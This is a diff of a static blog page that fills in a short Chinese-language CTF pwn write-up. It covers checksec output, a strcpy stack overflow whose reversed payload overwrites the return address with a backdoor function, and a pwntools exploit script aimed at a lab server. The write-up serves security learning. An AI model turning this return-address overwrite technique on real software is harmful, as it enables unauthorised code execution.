@@ -17,7 +17,7 @@
 
 
 
-<title>How to 5tart? | Wait a second</title>
+<title>Wait a second</title>
 
 
 
@@ -530,7 +530,7 @@
     <div class="flex flex-col gap-2 pt-4 md:pt-6">
       <!-- Title -->
       <div id="article-title" class="leading-snug">
-        <p class="text-3xl font-bold text-[var(--c-100)] mb-4">How to 5tart?</p>
+        <p class="text-3xl font-bold text-[var(--c-100)] mb-4"></p>
       </div>
       <!-- Meta data -->
       <div>
@@ -540,11 +540,11 @@
             <!-- Dates -->
             <div class="flex items-center gap-1">
               <iconify-icon width="18" icon="mingcute:add-circle-fill" ></iconify-icon>
-              Created: <time class="w-max">2026-11-02</time>
+              Created: <time class="w-max">2026-11-17</time>
             </div>
             <div class="flex items-center gap-1">
               <iconify-icon width="18" icon="mingcute:refresh-3-fill" ></iconify-icon>
-              Edited: <time class="w-max">2026-11-02</time>
+              Edited: <time class="w-max">2026-11-17</time>
             </div>
           </div>
           <div class="flex flex-wrap items-center gap-x-3 gap-y-3">
@@ -554,7 +554,7 @@
             <!-- Word count -->
             <span class="flex items-center gap-1">
               <iconify-icon width="18" icon="mingcute:book-2-fill" ></iconify-icon>
-              <span>0 words, 1 min</span>
+              <span>298 words, 1 min</span>
             </span>
             <!-- Categories -->
             
@@ -572,7 +572,8 @@
   </header>
   <!-- content -->
   <article class="post-content prose m-auto dark:prose-invert">
-    
+    <p>解包识别失败,（绕了一大圈后）file：$ file edoc_knu.zip<br>edoc_knu.zip: POSIX tar archive (GNU)v<br>原来是tar.根据tar解包，得到文件，直接套IDA，得到伪代码：![[Pasted image 20261117130952.png]]checksec：   Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No![[Pasted image 20261117132006.png]]<br>走strcpy溢出，用后门gift覆盖返回地址。不过因为1用到了mirror，也就是说要把padding（32+8）+地址整体反着塞进去,过程中成功踩了各种坑。最后跳转system rsp会对不齐，ret和返回地址放到一起似乎会识别成同一个地址。Gdb鼓捣了半天最后强行跳到gift 的push rbp后面解决。![[Pasted image 20261117132106.png]]&#96;&#96;&#96;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">25770</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b view_mirror</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./edoc_knu&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;172.18.137.222&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,sc)</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.send(b&#x27;1\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendlineafter(b&#x27;content: &#x27;,+b&#x27;a&#x27;*40)</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content: &#x27;</span>,p32(<span class="number">0x691540</span>)[:<span class="number">3</span>]+<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;3\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
   </article>
 
   <!-- prev and next -->
@@ -582,20 +583,21 @@
   ">
     <div>
       
-        <a href="/2026/11/14/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E4%B8%8A%E4%BC%A0/"
-          class="
-            transition-all
-            flex justify-center
-            hover:-translate-x-1
-            hover:text-[var(--c-80)]
-          ">
-          <iconify-icon width="20" icon="mingcute:left-fill" data-inline="false">
-          </iconify-icon>
-          测试一下上传
-        </a>
-      
     </div>
     <div>
+      
+        <a href="/2026/11/14/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E4%B8%8A%E4%BC%A0/"
+          class="
+            flex 
+            justify-center
+            hover:translate-x-1 
+            transition-transform
+            hover:text-[var(--c-100)]
+          "
+        >
+          测试一下上传
+          <iconify-icon width="20" icon="mingcute:right-fill" data-inline="false"></iconify-icon>
+        </a>
       
     </div>
   </div>
